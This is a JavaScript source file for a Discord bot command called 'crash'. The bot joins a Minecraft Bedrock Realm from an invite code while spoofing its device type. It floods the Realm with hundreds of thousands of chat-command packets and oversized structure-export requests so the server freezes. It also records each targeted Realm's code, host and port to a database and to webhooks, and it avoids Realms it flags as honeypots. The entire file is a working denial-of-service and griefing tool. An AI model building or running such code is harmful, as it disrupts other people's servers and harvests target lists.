const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const bedrock = require('bedrock-protocol');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const databasePath = path.join(__dirname, '..', '..', 'data', 'database.json');
const webhookCrashClient = new WebhookClient({ url: '' });
const webhookDatabaseClient = new WebhookClient({ url: '' }); // can be same weebhook 
// pls change weebhook in line 186 and 374
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const accseptEmoji = '<a:Check:1256612972793565204>';
const errorEmoji = '<:deny:1256622572762562681>';
const one = '<:lll:1258031168281116794>';
const second = '<:down:1258031126472036433>';

const deviceOptions = {
  'Unknown': 0,
  'Android': 1,
  'iOS': 2,
  'OSX': 3,
  'FireOS': 4,
  'GearVR': 5,
  'Hololens': 6,
  'Windows 10 (x64)': 7,
  'Windows 10 (x86)': 8,
  'Dedicated Server': 9,
  'TvOS': 10,
  'Orbis': 11,
  'Nintendo Switch': 12,
  'Xbox': 13,
  'Windows Phone': 14,
  'Linux': 15
};

let blacklistedUsers = new Set();
let honeypotRealms = new Set();

async function loadBlacklist() {
  try {
    const blacklistData = await fs.promises.readFile(blacklistPath, 'utf-8');
    blacklistedUsers = new Set(JSON.parse(blacklistData));
  } catch (error) {
    console.error('Fehler beim Laden der Blacklist:', error);
  }
}

async function loadHoneypot() {
  try {
    const honeypotData = await fs.promises.readFile(honeypotPath, 'utf-8');
    honeypotRealms = new Set(JSON.parse(honeypotData));
  } catch (error) {
    console.error('Fehler beim Laden der Honeypot-Datei:', error);
  }
}

loadBlacklist();
loadHoneypot();

module.exports = {
  command: new SlashCommandBuilder()
    .setName('crash')
    .setDescription('Spams realm with a message')
    .addStringOption(option =>
      option.setName('realmcode')
        .setDescription('Realm Code To Spam')
        .setRequired(true)
        .setMinLength(11)
        .setMaxLength(11)
    )
    .addStringOption(option =>
      option.setName('device_os')
        .setDescription('The device to spoof as')
        .setRequired(true)
        .addChoices(
          { name: 'Unknown', value: 'Unknown' },
          { name: 'Android', value: 'Android' },
          { name: 'Samsung Smart fridge', value: 'Android' },
          { name: 'iOS', value: 'iOS' },
          { name: 'Ocean Gate', value: 'OSX' },
          { name: 'OSX (macOS)', value: 'OSX' },
          { name: 'FireOS', value: 'FireOS' },
          { name: 'GearVR', value: 'GearVR' },
          { name: 'Hololens', value: 'Hololens' },
          { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
          { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
          { name: 'Dedicated Server', value: 'Dedicated Server' },
          { name: 'TvOS', value: 'TvOS' },
          { name: 'Orbis', value: 'Orbis' },
          { name: 'Nintendo Switch', value: 'Nintendo Switch' },
          { name: 'Xbox', value: 'Xbox' },
          { name: 'Windows Phone', value: 'Windows Phone' },
          { name: 'Linux', value: 'Linux' }
        )
    ),
  callback: async (interaction) => {
    try {
      await interaction.deferReply({ ephemeral: true });
    } catch (error) {
      if (error.code === 10062) { 
        console.warn('Unknown interaction, likely due to a timeout.');
        return;
      }
      console.error('Error deferring reply:', error);
    }

    const userId = interaction.user.id;
    const userTag = interaction.user.tag;
    const realmCode = interaction.options.getString('realmcode');
    const deviceOS = interaction.options.getString('device_os');

    const isBlacklisted = blacklistedUsers.has(userId);

    if (isBlacklisted) {
      const embed = new EmbedBuilder()
        .setColor('#ff0000')
        .setTitle('Womp Womp')
        .setDescription(`${lEmoji} You are blacklisted ${lEmoji}`);
      try {
        await interaction.editReply({ embeds: [embed], ephemeral: false });
      } catch (error) {
        console.error('Error sending blacklist message:', error);
      }

      const webhookEmbed = new EmbedBuilder()
        .setTitle('Blacklist Check')
        .setDescription(`User \`${userTag}\` attempted to use the \`crash\` command but is blacklisted.`)
        .setColor('#ff0000')
        .addFields(
          { name: 'Realm Code', value: realmCode },
          { name: 'Device', value: deviceOS }
        )
        .setTimestamp();

      try {
        await webhookCrashClient.send({ embeds: [webhookEmbed] });
      } catch (error) {
        console.error('Error sending webhook log:', error);
      }
      return;
    }

    try {
      const realmData = await checkCodes([realmCode]);
      if (realmData[0].playerCount === 0 || (realmData[0].status === 'error' && realmData[0].error.includes('503'))) {
        honeypotRealms.add(realmCode);
        await fs.promises.writeFile(honeypotPath, JSON.stringify([...honeypotRealms], null, 2));

        let databaseData = await fs.promises.readFile(databasePath, 'utf-8');
        let database = databaseData.trim() ? JSON.parse(databaseData) : [];
        database = database.filter(entry => entry['Realm Code'] !== realmCode);
        await fs.promises.writeFile(databasePath, JSON.stringify(database, null, 2));

        const honeypotEmbed = new EmbedBuilder()
          .setColor('#ff0000')
          .setTitle('Honeypot Detected')
          .setDescription(` ${errorEmoji} This realm is a honeypot and cannot be joined ${errorEmoji}`);
        try {
          await interaction.editReply({ embeds: [honeypotEmbed], ephemeral: true });
        } catch (error) {
          console.error('Error sending honeypot message:', error);
        }

        const webhookHoneypotEmbed = new EmbedBuilder()
          .setTitle('Honeypot Detected')
          .setDescription(`User \`${userTag}\` attempted to join a honeypot realm.`)
          .setColor('#ff0000')
          .addFields(
            { name: 'Realm Code', value: realmCode },
            { name: 'Device', value: deviceOS }
          )
          .setTimestamp();

        try {
          await webhookCrashClient.send({ embeds: [webhookHoneypotEmbed] });
        } catch (error) {
          console.error('Error sending honeypot webhook log:', error);
        }

        try {
          await axios.post('https://discord.com/api/webhooks/', {
            content: `Honeypot Realm Code: ${realmCode}`
          });
        } catch (error) {
          console.error('Error sending honeypot realm code to webhook:', error);
        }

        return;
      }

      const authFlow = new Authflow('unique_identifier', './');
      const token = await authFlow.getMinecraftJavaToken();
      console.log('Token obtained:', token);

      const bedrockClient = bedrock.createClient({
        authFlow: authFlow,
        deviceOS: deviceOptions[deviceOS],
        realms: {
          realmInvite: `https://realms.gg/${realmCode}`
        }
      });

      bedrockClient.on('join', async () => {
        const joinEmbed = new EmbedBuilder()
          .setDescription(`Freezing \`${realmCode}\`!`)
          .setColor(136); // Pink
        try {
          await interaction.editReply({ embeds: [joinEmbed] });
        } catch (error) {
          console.error('Error sending join message:', error);
        }

        const sendCommand = (command) => {
          bedrockClient.write('command_request', command);
        };

        const inter = setInterval(() => {
          spamOne(sendCommand);
          crashOne(sendCommand);
          spamTwo(sendCommand);
          crashTwo(sendCommand);
          spamThree(sendCommand);
          spamFour(sendCommand);
          splitCrash(bedrockClient);
        }, 340);

        setTimeout(async () => {
          clearInterval(inter);
          bedrockClient.disconnect();

          const disconnectEmbed = new EmbedBuilder()
            .setDescription(`Disconnected from \`${realmCode}\` ${accseptEmoji}`)
            .setColor(1286414);
          try {
            await interaction.followUp({ embeds: [disconnectEmbed] });
          } catch (error) {
            console.error('Error sending disconnect message:', error);
          }
          console.log('Disconnected from', realmCode);

          // Add realm to database
          if (realmData[0].status === 'valid') {
            await addRealmCode(realmCode, realmData[0].realmName, realmData[0].realmId, realmData[0].host, realmData[0].port, interaction);
          }

          const webhookEmbed = new EmbedBuilder()
            .setTitle('Realm Crashed')
            .setDescription(`User \`${userTag}\` used the \`crash\` command.`)
            .setColor('#ff0000')
            .addFields(
              { name: 'Realm Code', value: realmCode },
              { name: 'Device', value: deviceOS }
            )
            .setTimestamp();

          try {
            await webhookCrashClient.send({ embeds: [webhookEmbed] });
          } catch (error) {
            console.error('Error sending realm crashed webhook log:', error);
          }
        }, 60 * 1000);
      });

      bedrockClient.on('error', async (error) => {
        const errorEmbed = new EmbedBuilder()
          .setDescription(`Error: ${error.message}`)
          .setColor(16724787);
        try {
          await interaction.editReply({ embeds: [errorEmbed] });
        } catch (err) {
          console.error('Error sending error message:', err);
        }

        const webhookEmbed = new EmbedBuilder()
          .setTitle('Error')
          .setDescription(`Error occurred for user \`${userTag}\` while using the \`crash\` command.`)
          .setColor('#ff0000')
          .addFields(
            { name: 'Realm Code', value: realmCode },
            { name: 'Device', value: deviceOS },
            { name: 'Error', value: error.message }
          )
          .setTimestamp();

        try {
          await webhookCrashClient.send({ embeds: [webhookEmbed] });
        } catch (err) {
          console.error('Error sending error webhook log:', err);
        }
      });

    } catch (e) {
      console.error(`Error executing command: ${e}`);
      const errorEmbed = new EmbedBuilder()
        .setDescription(`Failed to join or spam!\n${e.message || e}`)
        .setColor(16724787);
      try {
        await interaction.editReply({ embeds: [errorEmbed] });
      } catch (err) {
        console.error('Error sending command error message:', err);
      }
    }
  }
};

async function checkCodes(codes) {
  const profilesFolder = './';
  const options = {
    authTitle: '00000000441cc96b',
    flow: 'live'
  };

  const userIdentifier = 'unique_identifier'; // i got sth to eat yummy
  const authFlow = new Authflow(userIdentifier, profilesFolder, options);
  const api = RealmAPI.from(authFlow, 'bedrock');

  const checkPromises = codes.map(async (code) => {
    try {
      const realm = await api.getRealmFromInvite(code);
      if (!realm) {
        return { code, status: 'invalid' };
      }

      const address = await realm.getAddress();
      const realmData = await api.getRealm(realm.id);
      const playerCount = realmData.players.length;

      return {
        code,
        status: 'valid',
        realmName: realm.name,
        realmId: realm.id,
        host: address.host,
        port: address.port,
        playerCount
      };
    } catch (error) {
      console.error('Error fetching realm data:', error);
      return { code, status: 'error', error: error.message };
    }
  });

  try {
    return await Promise.all(checkPromises);
  } catch (error) {
    console.error('Error fetching data:', error);
    return [{ code: 'unknown', status: 'error', error: error.message }];
  }
}

async function addRealmCode(realmCode, name, id, host, port, interaction) {
  let databaseData = await fs.promises.readFile(databasePath, 'utf-8');
  let database = databaseData.trim() ? JSON.parse(databaseData) : [];

  if (database.some(entry => entry['Realm Code'] === realmCode)) {
    try {
      await interaction.editReply({ embeds: [new EmbedBuilder().setColor('#ff0000').setTitle('Error').setDescription('This code already exists in the database.')], ephemeral: true });
    } catch (error) {
      console.error('Error sending database error message:', error);
    }
    return;
  }

  database.push({ Name: name, "Realm Code": realmCode, "Realm ID": id, IP: host, Port: port });
  await fs.promises.writeFile(databasePath, JSON.stringify(database, null, 2));

  // Send the realm code to the webhook
  try {
    await axios.post('https://discord.com/api/webhooks/', {
      content: `Realm Code: ${realmCode}\nName: ${name}\nID: ${id}\nHost: ${host}\nPort: ${port}`
    });
    console.log('Realm code sent to webhook successfully.');
  } catch (error) {
    console.error('Failed to send realm code to webhook:', error);
  }

  try {
    await interaction.editReply({ embeds: [new EmbedBuilder().setColor('#00ff00').setTitle('Success').setDescription('The code and associated information have been added to the database.')], ephemeral: false });
  } catch (error) {
    console.error('Error sending success message:', error);
  }
}

function spamOne(sendCommand) {
  for (let i = 0; i < 5000; i++) { // more packet = more spam ( be aware if the bot need to send more packets its longer in the realm)
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} |§4§l§ TSL §1§ Nuker §4§ on TOP `,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function crashOne(sendCommand) {
  for (let i = 0; i < 200000; i++) { // more packets = longer crash 
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function spamTwo(sendCommand) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function crashTwo(sendCommand) {
  for (let i = 0; i < 200000; i++) {
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function spamThree(sendCommand) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function spamFour(sendCommand) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `tell @a §l§c§k${"@e".repeat(100)} | §4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function splitCrash(bedrockClient) {
  let x = 0;
  let y = 0;
  let z = 0;
  let unique_id = -858993459156n; // probely no worky 

  for (let i = 0; i < 50; i++) {
    bedrockClient.write('structure_template_data_export_request', {
      name: `house${i}`,
      position: { x, y, z },
      settings: {
        palette_name: "",
        ignore_entities: false,
        non_ticking_players_and_ticking_areas: false,
        size: { x: 9999, y: 100, z: 9999 },
        structure_offset: { x: 9999, y: 50, z: 9999 },
        last_editing_player_unique_id: unique_id,
        rotation: 3,
        mirror: 3,
        animation_mode: 2,
        animation_duration: 999999,
        integrity: 1,
        seed: 0,
        pivot: { x: -9999, y: 64, z: 99999 }
      },
      request_type: 1
    });
  }
}
